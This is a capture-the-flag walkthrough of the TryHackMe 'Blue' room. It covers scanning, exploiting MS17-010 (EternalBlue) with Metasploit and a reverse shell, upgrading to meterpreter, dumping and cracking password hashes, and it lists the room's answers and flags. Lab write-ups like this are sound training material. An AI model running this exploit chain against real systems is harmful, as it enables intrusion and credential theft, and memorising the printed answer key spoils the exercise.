# Blue - TryHackMe 

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## Overview
- **Room URL:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)
- **Difficulty:** Easy
- **Time to complete:** 30

## Walkthrough
### 1. Recon
- <p>How many ports are open with a port number under 1000?</p>
```bash
nmap <MACHINE_IP> -p 0-1000
```
**=> Answer: `3`**

- <p>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</p>

**=> Answer: `ms17-010`**

### 2. Gain Access
- <p>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)</p>
```bash
msfconsole
search ms17_010
```
**=> Answer: `exploit/windows/smb/ms17_010_eternalblue`**

- <p>Show options and set the one required value. What is the name of this value? (All caps for submission)</p>
```bash
use ms17_010_eternalblue
show options
```
**=> Answer: `RHOSTS`**

- Gain access to the target VM:
```bash
set payload windows/x64/shell/reverse_tcp
set RHOSTS <target VM IP>
run
```

- Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
```bash
Ctrl + Z
use post/multi/manage/shell_to_meterpreter
sessions -l
set SESSION 2
run
```

### 3. Escalate
- <p>If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) </p>

**=> Answer: `post/multi/manage/shell_to_meterpreter`**

- <p>Select this (use MODULE_PATH). Show options, what option are we required to change?</p>

**=> Answer: `SESSION`**

- <p>Set the required option, you may need to list all of the sessions to find your target here. </p>
```bash
SET SESSION 2
```

- <p>Run! If this doesn't work, try completing the exploit from the previous task once more.</p>
```bash
run
```

- <p>Once the meterpreter shell conversion completes, select that session for use.</p>
```
sessions -i <meterpreter session>
```

- <p>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. </p>

- <p>List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</p>

- <p>Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. </p>
```bash
# Take several attempts try multiple processes
migrate <process id>
```

### 4. Cracking
- <p>Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? </p>
```bash
hashdump
```
**=> Answer: `Jon`**

- <p>Copy this password hash to a file and research how to crack it. What is the cracked password?</p>
```bash
echo 'YOUR HASH VALUE' > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# If you just have rockyou.txt.gz, decompress it.
gzip -d /usr/share/wordlists/rockyou.txt.gz
# Run hashcat again
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**=> Answer: `alqfna22`**

### 5. Find flags!
```
Ctrl + Z
Get back to the original shell for better performance
sessions -i <original session id>
```
- Flag1? <i>This flag can be found at the system root. </i>
```powershell
cd ..
cd ..
dir
type flag1.txt
```
**=> Answer: `flag{access_the_machine}`**

- <p>Flag2? <i>This flag can be found at the location where passwords are stored within Windows.</i></p><p><br /></p><p>*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. </p>
```powershell
cd Windows/System32/Config
dir
type flag2.txt
```
**=> Answer: `flag{sam_database_elevated_access}`**

- <p>flag3? <i>This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. </i></p>
```powershell
cd /Users/Jon/Documents
type flag3.txt
```
**=> Answer: `flag{admin_documents_can_be_valuable}`**

